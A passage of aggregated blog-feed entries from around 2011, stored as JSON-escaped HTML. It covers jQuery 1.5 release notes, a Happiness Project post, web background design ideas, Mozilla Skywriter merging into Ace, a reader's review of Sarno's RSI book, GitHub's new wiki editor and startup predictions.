information about <a href=\"http://api.jquery.com/jQuery.sub/\">jQuery.sub()</a> can be found in the API documentation.</p>\n<p>Note that if you’re looking to use this for plugin development, you should first strongly consider using something like the jQuery UI widget factory which manages both state and plugin sub-methods. <a href=\"http://blog.nemikor.com/2010/05/15/building-stateful-jquery-plugins/\">Some examples of using the jQuery UI widget factory</a> to build a plugin.</p>\n<h2>Adjacent Traversal Performance</h2>\n<p>In this release we’ve also been able to improve the performance of some commonly-used traversal methods: .children(), .prev(), and .next(). The speed-ups that we’re seeing are quite substantial (potentially many many times faster, depending upon the browser).</p>\n<p><a title=\".children() Performance in jQuery 1.5 by John Resig, on Flickr\" href=\"http://www.flickr.com/photos/jeresig/5404543235/\"><img src=\"http://farm6.static.flickr.com/5260/5404543235_dcdd4cf714.jpg\" alt=\".children() Performance in jQuery 1.5\" width=\"500\" height=\"375\"></a></p>\n<p><a title=\".prev() Performance in jQuery 1.5 by John Resig, on Flickr\" href=\"http://www.flickr.com/photos/jeresig/5404543659/\"><img src=\"http://farm6.static.flickr.com/5099/5404543659_82b480e578.jpg\" alt=\".prev() Performance in jQuery 1.5\" width=\"500\" height=\"375\"></a></p>\n<p><a title=\".next() Performance in jQuery 1.5 by John Resig, on Flickr\" href=\"http://www.flickr.com/photos/jeresig/5404544105/\"><img src=\"http://farm6.static.flickr.com/5012/5404544105_66670184f3.jpg\" alt=\".next() Performance in jQuery 1.5\" width=\"500\" height=\"375\"></a></p>\n<p><a href=\"http://jsperf.com/jquery-15-unique-traversal\">Performance Test Case and Raw Numbers</a></p>\n<h2>Build System</h2>\n<p>Finally, we’ve made some changes to jQuery’s internal build system. We’ve worked to standardize all of our build process upon the excellent server-side JavaScript environment: <a href=\"http://nodejs.org/\">NodeJS</a>. We especially appreciate this as we’re able to reduce our dependency upon legacy Java/Rhino systems and focus more squarely on up-and-coming JavaScript environments.</p>\n<p>Additionally with this switch we’ve moved to using <a href=\"https://github.com/mishoo/UglifyJS\">UglifyJS</a> from the Google Closure Compiler. We’ve seen some solid file size improvements while using it so we’re quite pleased with the switch.</p>\n<h2>Thanks!</h2>\n<p>As always we want to thank everyone that helped with this release – without your contributions this release would not have been possible. If you have any questions or spot any bugs please submit your issues to the <a href=\"http://bugs.jquery.com/\">jQuery bug tracker</a>.</p>\n<img src=\"http://feeds.feedburner.com/~r/jquery/~4/lKwpJhjO8E0\" height=\"1\" width=\"1\">"

But presto! the work has magically reappeared. (Which suspiciously suggests computer ineptitude on my part...but I'm just happy that I have my work back.)</p>\n\n<p>So here's the post that I meant to post last week:</p>\n\n<p>One of my Twelve Personal Commandments is to <a href=\"http://www.happiness-project.com/happiness_project/2009/01/why-its-important-to-identify-the-problem-its-harder-than-it-sounds.html\">Identify the problem</a>.</p>\n\n<p>Once you identify a problem, it’s much simpler to solve it. \"But,\" you might say, \"if I have a problem, how it is possible that I haven’t identified it?\" This rule seems so obvious that it’s hard to explain why it’s so tremendously helpful. </p>\n\n<p>I’ve realized that often I’ll put up with a problem or an irritation for years, because I haven’t actually examined the nature of the problem and how it might be solved. Example:</p>\n\n<p>I’m always cold. I’ll be in a room that other people find comfortable, and my hands will turn purple, my nose will be icy, my feet will be numb. I do my best to stay warm by wearing long underwear and heavy sweaters, constantly drinking hot drinks, sometimes wearing a wool hat indoors, and not sitting still for too long.</p>\n\n<p>My hands always suffer the most. In fact, in high school I went to a doctor about my cold hands, because they were so stiff from cold that I was having trouble writing exams. </p>\n\n<p>Over the years, I’ve developed a lot of strategies for dealing with my coldness. For whatever reason, though, for the past few months, my hands have been colder than usual, despite the long underwear, hot drinks, etc. Having such cold hands makes typing uncomfortable, which is a problem, because I type many hours every day.  </p>\n\n<p><blockquote>\n\tFinally, I stopped and said to myself, “What’s the problem?”<br>\n\t“My hands hurt from the cold.”<br>\n\t“How could I make them warmer?”<br>\n\t“I wish I could wear mittens all day long.”<br>\n\t“Why don’t I wear mittens all day long?”<br>\n\t“Because I have to type.”<br>\n\tThen the big insight – “Why don’t I get those fingertip-less gloves to wear?”<br>\n\t“Nah, I’d look too affected!” I thought. “What am I, a starving Russian artist?”<br>\n\tThen I realized – it wasn’t affected to wear those gloves if I actually needed them. Which I absolutely do.\n</blockquote></p>\n\n<p>Identify the problem: Cold hands.</p>\n\n<p>Solution: Buy those gloves.\n</p>\n<p>The commandment to “Identify the problem” is really a reminder about mindfulness. Mindfulness! With happiness, so often, it comes back to mindfulness. Of course, I fully realize that in the scheme of life, having cold hands is a <em>very </em>minor complaint. But as Samuel Johnson observed, “It is by studying <em>little things</em> that we attain the great art of having as little misery, and as much happiness as possible.”</p>\n\n<p>Update: I have ordered my fingerless gloves, but they haven't arrived yet. (Actually making this purchase was a big step for an <a href=\"http://www.happiness-project.com/happiness_project/2009/04/quiz-are-you-an-overbuyer-or-an-underbuyer.html\">under-buyer</a> like me.)  </p>\n\n<p>Have you ever fixed a small problem that gave you a disproportionate happiness boost? I will really be happy if these gloves help me keep my hands warmer.</p>\n\n<p>* I was so thrilled to see this lovely note, <a href=\"http://melanienotkin.com/2011/01/my-happiness-project/\">My Happiness Project</a>, on my friend Melanie Notkin's site, as she gets ready for the publication of her book, <a href=\"http://melanienotkin.com/book-2/buy-the-book/\">Savvy Auntie</a>.

    "content" : {
      "direction" : "ltr",
      "content" : "<p>One of the most frequently asked questions we receive is a variant of what kind of background someone should use for their site. These designers have the basic content and the layout pretty much nailed down, but the background is either too boring or too busy and they don’t know how to fix it.</p>\n<p>Today we’re going to take a look at a few live sites to grab some inspiration on how to effectively add interesting backgrounds to a web page. Bookmark this article and come back to it the next time you’re stuck on a background decision. </p>\n<p><span></span></p>\n<h2>#1 Sketch It</h2>\n<p>This kind of background became popular a few years ago and still persists today. It springs from the idea of a notebook full of doodles, like that of your typical teenager during English class. Everything has a rough, quickly sketched appearance and the page is a fairly random looking collection of ideas that are all scattered around and placed at various rotations. </p>\n<p><a rel=\"nofollow\" href=\"http://www.notchstudio.com/\">NotchStudio</a> pulls this idea off nicely and in a fairly subdued manner. </p>\n<div><a rel=\"nofollow\" href=\"http://www.notchstudio.com/\"><img src=\"http://designshack.co.uk/wp-content/uploads/backgroundideas-1.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>Even if you can’t draw, this look is fairly easy to pull off as the doodles are generally super basic. If you have a Wacom or iPad, it’s quite easy to trace some of your own photos or printed text in a manner that reflects this style. There are also plenty of free fonts like <a rel=\"nofollow\" href=\"http://www.dafont.com/pointy.font\">Pointy</a> that will help you pull off awesome sketched text with zero effort.</p>\n<h2>#2 Subtle Parchment</h2>\n<p>Paper textures have always intrigued designers and we’ll likely be using them for ages to come. The current trend isn’t so much the intense grunge of a few years ago but rather a much more subtle effect that you could easily miss if you weren’t looking for it. </p>\n<p>Notice how the texture used on <a rel=\"nofollow\" href=\"http://beautifultype.net/\">Beautiful Type’s</a> site below isn’t distracting or exaggerated but instead merely brings a nice finish to a site that would already look perfectly good without it.</p>\n<div><a rel=\"nofollow\" href=\"http://beautifultype.net/\"><img src=\"http://designshack.co.uk/wp-content/uploads/backgroundideas-2.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>Check out <a rel=\"nofollow\" href=\"http://lostandtaken.com/\">Lost and Taken</a> for tons of great textures that you can use in all your designs. </p>\n<h2>#3 A Radial Gradient</h2>\n<p>Gradients have been getting a bad rap lately from designers who think they are overused. I personally think that they are easily misused and poorly executed, but can’t ever see a time coming when all designs everywhere use purely solid colors with absolutely no gradations. Since gradients reflect reality (we never see pure, unadulterated solid colors in the natural world) designers will continue to use them to make their designs feel more real.</p>\n<p>With gradients, it’s often best to just keep things simple. Don’t go mixing crazy colors and creating muddy transitions, opt instead for a simple gradient. One of my favorites is the good old gray to black (or darker gray) radial gradient. It’s clean and easy to implement and looks really classy.</p>\n<p>You can see this in practice on the <a rel=\"nofollow\" href=\"http://177themes.com/\">177themes</a> website shown below.</p>\n<div><a rel=\"nofollow\" href=\"http://177themes.com/\"><img src=\"http://designshack.co.uk/wp-content/uploads/backgroundideas-3.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<h2>#4 Two-Tone It!</h2>\n<p>Another solution that I find to be particularly elegant or bold (depending on the execution) is to put a hard transition right through the page. This is most often done horizontally but can feel more unique and eye-catching if done vertically.</p>\n<div><a rel=\"nofollow\" href=\"http://www.weisswein-party.de/\"><img src=\"http://designshack.co.uk/wp-content/uploads/backgroundideas-4.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>The idea here is to utilize the magic of contrast. Our eyes are naturally drawn to contrast, we simply can’t help but look! The key to pulling this method off then is to make sure your two colors really contrast. Don’t pick anything that conflicts or clashes, instead try one really dark color and then a really light shade of the same color. </p>\n<p>My favorite tool for building these types of combinations is <a rel=\"nofollow\" href=\"http://0to255.com/\">0to255</a>, which allows you to quickly and easily grab web values for variations of any color.</p>\n<h2>#5 Full Screen Photographs</h2>\n<p>I mention this idea so much you’re probably sick of it, but I’ll continue to drill it into your head for as long as I can: great photography makes for great design. It’s plain and simple. We all love to look at a good photo so working one into your design makes for a website that everyone loves to look at. Easy right?</p>\n<p>Photos provide inspiration for the entire site design. You can grab colors, textures and even typography inspiration from a photograph and create a nice coherent theme. </p>\n<p>Check out how the dark nature of the designed elements in the site below reflect the look and feel of many of the photos used on the homepage slideshow.</p>\n<div><a rel=\"nofollow\" href=\"http://www.megumi.it/\"><img src=\"http://designshack.co.uk/wp-content/uploads/backgroundideas-5.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>If you’re wondering how to code a site like this, check out our recent article, <a rel=\"nofollow\" href=\"http://designshack.co.uk/articles/javascript/easily-create-a-full-screen-photography-slideshow-website-without-flash\">Easily Create a Full Screen Photography Slideshow Website Without Flash</a>.</p>\n<h2>#6 Texture to Color Fade</h2>\n<p>One trick that I really like that I’ve been seeing a lot lately is to use lighting effects or something similar to throw in just a little bit of texture at the top of a page, which quickly fades to a solid color. </p>\n<p>Textures can easily reduce the readability of your text and add unnecessary visual noise to an otherwise usable page. Hinting at a texture in one location allows you to reap the benefits of the extra eye candy without sacrificing the overall aesthetic and/or readability on the site. </p>\n<div><a rel=\"nofollow\" href=\"http://www.mikeprecious.com/\"><img src=\"http://designshack.co.uk/wp-content/uploads/backgroundideas-7.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>We too often feel like choosing a texture means we have to flood the background with it using a CSS background image repeat. Try to be more selective with where your texture goes and you’ll find your designs immediately looking nicer.</p>\n<h2>#7 Look Up</h2>\n<p>The sky is a constant and fantastic distraction for humans. Clouds, rays of sunlight, stars, planets, the moon; all of these objects hold a sort of magic place in our minds that makes them irresistible to the eye.</p>\n<p>Be really careful when incorporating these elements into your background, it’s super easy to create something ugly and/or cliche. This technique should only be used by designers who have a real feel for aesthetics and how to take an idea like “space” and not make it look like something from an old Windows screensaver. </p>\n<p>The site below is a great example of a really beautiful sky scene being used as a strong website background. The planets are rendered beautifully with a vintage color vibe and a subtle texture provided by diagonal lines. This is the kind of attention to detail you should be familiar with before throwing a sky background on your site. </p>\n<div><img src=\"http://designshack.co.uk/wp-content/uploads/backgroundideas-8.jpg\" alt=\"screenshot\" width=\"510\"></div>\n<h2>#8 Argyle</h2>\n<p>I can hear you now, “Argyle? Are you nuts?” Before you go off on me in the comments, diamond patterns can yield some really attractive results. But, as with the previous tip, they shouldn’t be attempted by anyone but experienced designers who know how to use a crazy pattern without creating a really ugly website. </p>\n<p>Check out the really nice use of this idea in the website below. The modified argyle-style pattern is only there enough to add some nice colorful accents and doesn’t really go out of its way to grab your attention. </p>\n<div><a rel=\"nofollow\" href=\"http://bakery.reeflightinteractive.com/\"><img src=\"http://designshack.co.uk/wp-content/uploads/backgroundideas-9.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<h2>#9 Abstract &amp; Crazy</h2>\n<p>Are you sick of my suggestions to “be careful” and “take it easy” with subtle design touches? Well then this tip is for you. Sometimes the best background is something crazy and bold that doesn’t have to make sense with the content on the page, it just draws and holds your attention. </p>\n<p>I thought both of the websites below pulled this off really nicely. Notice how the second one particularly looks like a painted watercolor piece. This is a very popular technique that you can find lots of resources online to mimic.</p>\n<div><a rel=\"nofollow\" href=\"http://www.frequency.ie/\"><img src=\"http://designshack.co.uk/wp-content/uploads/backgroundideas-10.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<div><a rel=\"nofollow\" href=\"http://pixelbleed.net/\"><img src=\"http://designshack.co.uk/wp-content/uploads/backgroundideas-11.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>Go search <a rel=\"nofollow\" href=\"http://www.istockphoto.com/search/text/abstract_watercolor/source/basic/?\">iStock</a> with the term “abstract watercolor” to see what you can find. There are a lot of cheap images in this category that will really boost the visual interest of your page.</p>\n<h2>#10 Don’t Be Afraid of Solid Colors</h2>\n<p>All of the advice above is meant to meet your demands for great website background ideas. However, it’s very important for you to understand as a designer that there’s absolutely nothing wrong with solid-colored white space. It’s a key ingredient in many of my all-time favorite designs and learning how to properly wield it is an important part of becoming a designer.</p>\n<p>Check out the gorgeous <a rel=\"nofollow\" href=\"https://fusionads.net/bundle/closed\">Fuzion Ads</a> website below. The design is really a typographic feast and both holds your attention and communicates effectively despite the fact that the background is just a plain old boring solid color!</p>\n<div><a rel=\"nofollow\" href=\"https://fusionads.net/bundle/closed\"><img src=\"http://designshack.co.uk/wp-content/uploads/backgroundideas-12.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>Be sure to check out <a rel=\"nofollow\" href=\"http://color.aurlien.net/\">Piknik</a>, a free tool that you must add to your design arsenal. This site makes it super easy to preview and select colors to fill your screen with. You simply move your mouse around and the background changes color.</p>\n<h2>Conclusion</h2>\n<p>The background you choose sets the tone and personality for your entire site. I was working with a designer just the other day who wanted to have his site featured in our gallery, but had simply chosen a really poor background image. The design and layout of the site were great, but I just couldn’t get past the ugly background. After I pointed it out, he agreed and switched to something much simpler that really brought the site to a whole new level.</p>\n<p>As I said in the opening paragraphs, the next time you’re stuck in a design rut and can’t choose a good background for your site, come back to this post and try some of the ideas I’ve laid out here. Sooner or later you’re bound to land on one that’s just perfect for your project.</p>\n<p>As always, thanks for reading!

      "content" : "<div><em>The  Mozilla Skywriter project (formerly Bespin) is a Mozilla Labs  experiment to explore ideas around “coding in the cloud”. We’re happy to  announce that the project has found a new, permanent home as part of  the Ajax.org C</em><em>loud9</em><em> Editor (A</em><em>ce</em><em>) and Cloud9 IDE projects. Read on to hear more about the transition and what we’ve learned along the way.</em></div>\n<div><em><span></span><br>\n</em></div>\n<div><a href=\"http://benzilla.galbraiths.org/\">Ben  Galbraith</a> and <a href=\"http://almaer.com/blog/\">Dion Almaer</a> brought Bespin (later renamed to Mozilla  Skywriter) with them when they joined Mozilla at the end of 2008. It was  a <strong>beautiful, responsive code editing environment</strong> that lived completely  in the browser and on the web. It used the shiny new <a href=\"https://developer.mozilla.org/en/canvas_tutorial\">&lt;canvas&gt;</a> HTML  element. It immediately attracted a good deal of attention and a bunch  of activity along many axes. New Bespin fans:</div>\n<div>\n<ul>\n<li> contributed new syntax highlighters</li>\n<li>ripped the editor out of the tree and stuck it onto their sites</li>\n<li>tried  to set up their own servers</li>\n<li>made themes for other editors based on  Bespin’s theme, and</li>\n<li>complained about the many limitations they had to  deal with while coding in Bespin’s cloud.</li>\n</ul>\n</div>\n<div>Clearly,  there was a lot of interest in being able to write code in the browser  from wherever you are. I believe that there’s even more interest today  than there was back then with more devices and new operating systems  coming along that are viable platforms for working on the web.</div>\n<div>That  said, Mozilla has decided to <strong>charge up our efforts in developer tools</strong>.  We’ve got some large, ambitious goals and running a code hosting service  has never really been a part of that. Further, a code editor is a much  smaller part of the whole that we seek to build, <strong>making Mozilla  Skywriter much less of a focus for us</strong>.</div>\n<div>In  the last quarter of 2010, we met some of the people of <a href=\"http://ajax.org/\">Ajax.org</a> and  discovered that our interests and theirs lined up very well. Their  <a href=\"http://ace.ajax.org/\">Ajax.org Cloud9 Editor (Ace)</a> is a responsive, nicely built editor for the web. Unlike Skywriter, Ace uses the DOM to render instead of the &lt;canvas&gt; element making it compatible with <strong>a wider range of browsers</strong> and potentially giving it a leg up in accessibility. Furthermore, Ace is the editor used in Ajax.org’s <a href=\"http://cloud9ide.com/\">Cloud9 IDE</a>, which brings the “development in the cloud” idea forward.</div>\n<div>While Ace  had all of the niceties and more of Skywriter’s code editor, it was missing out on  Skywriter’s extensibility. We’ve worked with Ajax.org to merge in <strong>a  simplified version of Skywriter’s plugin system</strong> and some of Skywriter’s  extensibility points. Ajax.org also agreed to relicense the whole Ace  package under the tri-license (MPL/LGPL/GPL) that applies to Skywriter.  This license is <strong>friendly for all kinds of projects, whether open source  or not</strong>.</div>\n<div>Along  the way, we repackaged the <strong>plugin system</strong> as “<a href=\"https://github.com/mozilla/pilot\">pilot</a>” and the <strong>command  line</strong>, which has become even smoother to use, is in its own package  called “<a href=\"https://github.com/mozilla/cockpit\">cockpit</a>“. You can use just these components in your own projects  if you want to make them extensible or keyboard-friendly.</div>\n<div>Cloud9  IDE is GPL-licensed <a href=\"https://github.com/ajaxorg/cloud9\">open source</a>, with a <strong>NodeJS-based server</strong> and <strong>a  hosted service</strong> that Ajax.org currently offers in beta. Expect to see  lots of great things in the coming months for Cloud9.</div>\n<div>The merging of Ace  and Skywriter has gone even better than we’d expected. It’s gone so  well, in fact, that we’ve decided that the best thing to do for the  projects is to completely merge them. We’re pleased to report that <strong>the  Skywriter project is now being fully replaced by Ace</strong>.</div>\n<div>Here are the various changes that are taking place for this transition:</div>\n<div>\n<ul>\n<li>The Skywriter home page (http://mozillalabs.com/skywriter) will now point people at the Ace and Cloud9 projects.</li>\n<li>The new project homepage is <a href=\"http://ace.ajax.org/\">http:/</a><a href=\"http://ace.ajax.org/\">/ace.ajax.org</a></li>\n<li>Follow the project on Twitter: <a href=\"http://twitter.com/#!/cloud9_editor\">@cloud9_editor</a></li>\n<li>The skywriter and skywriter-core mailing lists are changing to <a href=\"http://groups.google.com/group/ace-discuss\">ace-discuss</a> and<a href=\"http://groups.google.com/group/ace-internals\"> ace-internals</a></li>\n<li>bespin.mozillalabs.com  will be changed to simply point to the main Skywriter page. The hosted  service there will no longer be available.</li>\n<li>bespinplugins.mozillalabs.com will also direct people to Ace.  We will keep the plugin gallery around for several months more so that  Bespin 0.9 users can continue to download the plugins that are there.</li>\n</ul>\n</div>\n<div>I promised to share some of the interesting things we’ve learned along the way:</div>\n<div>\n<ul>\n<li>A <strong>command line is a great thing</strong> for the user interface of programmer’s editor.\n<ul>\n<li>You can present a <strong>clutter-free user interface with a huge amount of functionality</strong> that is both hidden away and quickly accessible</li>\n<li>A <strong>command line based on a GUI</strong> like the browser can do a whole lot more than a command line that’s all text</li>\n<li>We still have a good deal of experimentation to do to make a command line that is <strong>fully discoverable and supports “point and click” interaction</strong></li>\n</ul>\n</li>\n<li><strong>Real-time collaboration</strong> is interesting and useful for remote pair programming… but is also not the primary way in which multi-programmer teams share code. That would be the version control system.</li>\n<li>The number of applications out there that can benefit from a good code editor is remarkably large and <strong>touches an enormous number of users</strong>.</li>\n<li>People looking to integrate code editing in their applications or wanting to use a cloud-based development environment have <strong>extraordinarily varied needs</strong>. Those people are all also programmers. This is why we invested in making Skywriter pluggable.</li>\n<li>The <strong>DOM can be fast, and is getting faster</strong>. The original Bespin release shocked people with how fast it ran, even on large files. The key was to draw only the visible portion of the file.  Ace works the same way, but rather than drawing on a canvas it draws with DOM nodes and lets the browser decide what to paint and when. Browsers are getting faster and faster at this all the time.</li>\n<li><strong>DOM Level 3 text events would help</strong>. Skywriter and Ace both resort to having a hidden textarea in order to accept input with non-Latin characters because there is no way we’ve found, even in modern browsers, to find out what <em>character</em> a user has typed.</li>\n<li><strong>People are more willing to change editors than you’d expect</strong>. Programmers <em>live</em> in their editors, so the editor is one tool that they’re often reluctant to change. But, if there’s enough other convenience to make up for it, many seem to be willing to give web-based editors a try. That said, Skywriter’s <a href=\"https://github.com/ajaxorg/ace/commit/1cba46b8d3340e17244157aede38d36970e3354b\">awesome keyboard support has landed in Ace</a>. If you’re a vim or emacs devoteé, you can help with fleshing out vim and emacs keybindings.</li>\n<li>We explored many other ideas that will likely appear in tools in one form or another from <a href=\"https://github.com/mozilla/doctorjs\">DoctorJS</a>‘s ability to work out types in JavaScript to <a href=\"http://benzilla.galbraiths.org/2009/05/15/the-bespin-pie/\">pie menus</a>.</li>\n</ul>\n<p>Those of us who have been working on Bespin and Skywriter all this time are going to continue working on Ace, adding new features and sprucing things up for our new developer tools. Stay tuned for the initial releases of Ace.</p>\n</div>\n<div>– <em>Kevin Dangoor, on behalf of the Skywriter and Ace teams</em></div>"

      "content" : "<p>If you follow me on <a href=\"http://twitter.com/kaibrach\">Twitter</a> or on this blog, you know that I’ve been <strike>complaining about</strike> struggling with <a href=\"http://en.wikipedia.org/wiki/Repetitive_strain_injury\">RSI</a> pain in my wrist and arm for <a href=\"http://blog.brizk.com/post/2105603779/battling-rsi-two-years-on\">almost 4 years</a> now. I can hardly recall the number of doctors and specialists I’ve seen, the websites and books I read on this topic and the amount of money I spent on ergonomic hardware and office equipment.</p>\n<p>When I first came across the book <a href=\"http://www.amazon.com/exec/obidos/ASIN/0446675156\">The Mindbody Prescription</a> by John E. Sarno I was very sceptical, not least because it sounds and looks like a cheap self-help book. After some research online, I found <a href=\"http://www.repetitive-strain-injury.de/success-story-rapid-recovery-from-rsi.php\">so</a> <a href=\"http://www.repetitive-strain-injury.de/success-story-carpal-tunnel-syndrome-plantar-fasciitis.php\">many</a> <a href=\"http://primal-page.com/sarno.htm\">positive</a> and <a href=\"http://podolsky.everybody.org/rsi/\">comprehensive</a> reviews (even a <a href=\"http://tmswiki.wetpaint.com/\">wiki</a>) on the theory behind the book that it definitely had my attention by then and I ordered it.</p>\n<p>I’ve just finished the book today. It’s not an easy read, mainly because it’s written by a professor of medicine who wants to address a broad base of professionals and patients alike in order to build a solid case for his theory.</p>\n<h2>The Theory</h2>\n<p>The main proposition of the book is this:  </p>\n<p><strong>Most physical pain we experience is usually the result of traumas in our childhood or early adult lives but also everyday stress at work, at home and in many other seemingly average circumstances. This stress builds up a lot of subconscious anger. Our mind then plays tricks and confuses us into focusing our attention on physical pain as an outlet, while the real problem is based on those hidden emotions and in particular deep rage. Sarno calls this Tension Myositis Syndrome (TMS) and suggests that in order to find a cure for our pain we simply need to realize that the origin of the pain is found in the unconscious mind and not in any bodily abnormality.</strong></p>\n<p>This is indeed a very short and vague description of his theory. The book goes to great lengths to prove how much sense this approach actually makes and he claims to have a 90-95% success rate in healing patients, some of which have suffered from back/leg/arm pain for decades.</p>\n<p>Sarno accepts the fact that his treatment method works best with patients that consider it a last resort. This is mainly because we first and foremost trust the traditional practices of ‘hard Western medicine’ that require hard facts (MRI scans, x-rays, blood samples etc.) for an illness to be treatable. It’s more difficult to prove that physical pain is caused by psychological issues than pointing out a small deformation on an x-ray.</p>\n<p>What Sarno is NOT saying is that “the pain is all in your head”. Many of his patients show real symptoms, such as swollen joints or herniated discs etc. He suggests that the source of the pain in TMS is mild oxygen deprivation to the involved tissues and organ systems, however, caused by the brain through repressed emotional anger.</p>\n<p>According to Sarno there are people with particular personality traits that are more inclined to suffer from TMS. And I must admit that it is quite astounding how much I could see myself in there: people that are perfectionistic, that <a href=\"http://blog.brizk.com/post/2663501679/the-goodism-paradox\">want to do good</a> to others and want the recognition for it, that get angry if things go wrong, that blame themselves for not doing enough, that sometimes suffer from low self-esteem and the list goes on. Add to that life changing experiences (sometimes good, sometimes bad) which I had plenty of in recent years with a close family member passing away and others becoming ill, moving countries and being accepted in a new group of friends.</p>\n<p>There are tons of things happening in all of our lives that add to our internal pressure and create anger at a level we can’t see or express.</p>\n<h2>The Treatment</h2>\n<p>About 90% of the book covers causes, misdiagnosises and the theory behind TMS. Only on the last 20 odd pages, he makes clear suggestions as to what can be done. But that’s fine, because while you are reading the book, it becomes clear that understanding TMS and the theory behind his mindbody approach actually is the treatment. He even goes as far as to claim that many people find themselves almost pain-free at the end of the book.  </p>\n<p>So in short, the solution is to become more aware of the fact that the pain is solely based on emotional, subconscious anger. If you make efforts to remind yourself of that and actively try to convince yourself (your brain) of what’s internally happening, it should work.  </p>\n<p>As for me, I’m not 100% pain-free yet, but I would definitely say it reduced my pain to a certain extent already. For me the book was a bit of an eye-opener. There is definitely substance to his claims and reading through the many online reviews further encouraged me to give it a fair go. You may say that it’s just a different way of describing the placebo effect, and yes, essentially that is exactly what Sarno’s approach is about: convincing the brain that the pain is non-existent. </p>\n<p>If you have “tried everything” to get rid of your pain and seriously start to worry about your future (like myself), you and this book are a perfect fit.</p>"

      "content" : "<p>Many of you already know about <a href=\"https://github.com/github/gollum\">Gollum</a>, the git-powered wiki system that we use for every GitHub Wiki. While the Wikis have been proven great for those that know git well, we want to involve everybody that may want to contribute to an open source project, whether or not they're good with git and code.</p>\n\n<p>Because of this, you may have noticed that today we're pushing out an entire front-end rewrite of GitHub's Wiki system. While they may not look too different from the Wikis you're used to, the new Wiki interface has been designed to make adding new features easy. Even with this release, we've added a few improvements:</p>\n\n<h3>A brand new editor</h3>\n\n<center><img src=\"https://s3.amazonaws.com/github-images/blog/2011/editor.png\" alt=\"wiki editor\"></center>\n\n\n<p>The biggest change to the GitHub wikis is the completely new editor.</p>\n\n<h4>Functional support for most popular markup languages</h4>\n\n<p>The new editor has the capability to support every markup language that GitHub Wikis support. If you're a fan of Markdown, Textile, pod or RDoc, the function bar buttons (e.g. bold, italic, underline, etc.) will now work. We've even written brand new inline help for many of GitHub Wiki's supported markup languages.</p>\n\n<p>The language definitions the editor uses are JSON-based and easy to edit. If you'd like us to support a markup language that we don't currently support, Gollum, GitHub's wiki software, is entirely open source -- <a href=\"https://github.com/github/gollum\">fork our code</a> and send us a pull request with changes that support your choice language.</p>\n\n<h4>Completely rewritten inline help</h4>\n\n<p>Inline help has also been completely rewritten for many of the editor's supported markup languages. Right now you might only see most of this help documentation in English, but our translators are already able to start working on the help for GitHub's other supported languages. If your markup language has inline help, a question-mark icon will appear in the editor's toolbar.</p>\n\n<h4>Inline footer and sidebar editing</h4>\n\n<p>GitHub Wikis have a little-documented ability for footers and sidebars, something which some of our git-based Wiki authors are familiar with. The new Wiki editor gives you limited web-based editing of the footers and sidebars you have on your site. Once you have created a footer or sidebar using the git access feature, you can edit it via the web interface.</p>\n\n<h3>Full-page preview</h3>\n\n<center><img src=\"https://s3.amazonaws.com/github-images/blog/2011/preview.png\" alt=\"wiki preview page\"></center>\n\n\n<p>The old Wiki editor allowed you to preview your content inline. Inline previewing doesn't really give you a full idea of what your page would appear like. Now, previews open in a new window or tab on a real Wiki page, giving you the ability to really see your changes as they would appear to a reader.</p>\n\n<h3>Revert capabilities</h3>\n\n<center><img src=\"https://s3.amazonaws.com/github-images/blog/2011/history.png\" alt=\"wiki history page\"></center>\n\n\n<p>Before this release, the only way to solve the problem was to revert to an older version of a Wiki page was via the git command-line or manually editing the change via the web-based editor. Revert capabilities have now been added to the web interface. Want to change back to a version before a dumb edit you've made? Don't worry about opening a terminal window -- you can now fix it by selecting a commit and reverting all changes in the time range.</p>\n\n<h3>New permissions settings</h3>\n\n<center><img src=\"https://s3.amazonaws.com/github-images/blog/2011/wiki-privacy.png\" alt=\"wiki permissions\"></center>\n\n\n<p>Before today, anybody could edit a wiki on a public repository. Now, repository owners have the ability to restrict editing to only those that are collaborators on that repository. If you'd like to use your Wiki for documentation but you don't want the world adding their own examples, simply check the box for this option on your Repository Administration page.</p>\n\n<h3>There's more in store</h3>\n\n<p>While we believe we're making a step in the right direction with the new UI, remember that the frontend was re-written for us to more easily add even more functionality to GitHub Wikis in the future. Be on the lookout for more improvements coming down the pipeline. If you'd like to use our git-backed wiki software on your site, clone <a href=\"https://github.com/github/gollum\">Gollum</a> and have fun.</p>"

(Way too many) Groupons, social games and photo-sharing apps</strong></p>\n<p>Unimaginative VCs — which is to say, all of us — tend to start the new year off throwing good money after bad on last year’s tired and expired ideas. 2011 will be no exception for “innovation imitation” with more group-buying ecommerce plays, more social game startups, and even more ways to do photo-sharing on Facebook and Twitter, now new and improved with 37 shades of yellow-gray filters. Humbug. My first easy and obvious prediction is that VCs will waste a ton of money chasing hundreds of “me-too” startup ideas. Nothing new here Kmart shoppers… let’s move along.</p>\n<p><strong>2. Commerce and coupons for location-based services (LBS), aka “The $5 check-in”</strong></p>\n<p>While there have been a bajillion startups pitching “check-ins” and location-based services in 2010, I really believe 2011 is the year we see this category finally get some legs and take off. Why? Because companies are finally starting to provide discounts and coupons to customers via mobile devices. And once the affiliate market develops for exchanging location and profile data, we should see more people adopting check-in behavior to qualify for discounts and loyalty programs for their favorite offline services. As I wrote earlier this year in a post called “<a href=\"http://500hats.typepad.com/500blogs/2010/04/checkins-are-coupons.html\">Check-ins are Coupons</a>”, once financial incentives are combined with existing game mechanics, we’ll start seeing mainstream usage for services like Foursquare and Facebook Places. Going forward we will see an explosion of LBS innovation after Google, Facebook, and other platforms begin pushing revenue incentives for apps that facilitate location data.</p>\n<p><strong>3. Crowdsourcing: The Web-enabled mass assembly line</strong></p>\n<p>The Internet is a great platform for distribution, but now you can use it to reach not only customers, but also workers — it’s called <strong><a href=\"http://en.wikipedia.org/wiki/Crowdsourcing\">crowdsourcing</a></strong>. While Amazon Mechanical Turk has been around for a few years enabling access to thousands of remote workers, new startups like <a href=\"http://crowdflower.com\">Crowdflower</a> (disclosure: I’m an investor) offer platforms for managing the distribution of small, specific tasks to a large and scalable workforce around the world.  By combining the Web with an “on-demand” workforce companies can grow rapidly, remixing both digital and human to weave an entirely new fabric of business services.</p>\n<p><strong>4. URLs for IRL: enabling the Internet of 